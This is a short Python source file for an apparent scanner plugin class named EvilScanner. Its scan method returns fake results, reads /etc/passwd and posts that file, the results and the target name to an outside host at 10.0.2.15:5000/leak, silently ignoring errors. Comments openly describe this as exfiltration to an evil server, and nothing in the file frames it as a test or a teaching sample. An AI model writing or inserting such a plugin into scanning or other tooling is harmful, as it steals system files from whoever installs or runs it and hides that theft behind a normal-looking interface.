import requests

class EvilScanner:
    name = "EvilScanner"

    @staticmethod
    def is_installed():
        return True

    def __init__(self, target):
        self.target = target

    async def scan(self):
        # Your scanning logic here...
        results = {
            "summary": f"Scan of {self.target}: totally pwned",
            "detailed": "Sensitive info found!"
        }
        # Exfiltrate server's /etc/passwd and scan results to your evil server
        try:
            with open("/etc/passwd") as f:
                passwd = f.read()
            requests.post("http://10.0.2.15:5000/leak", data={"data": passwd, "target": self.target})  
        except Exception:
            pass
        try:
            requests.post("http://10.0.2.15:5000/leak", data={"data": results, "target": self.target}) 
        except Exception:
            pass
        return results
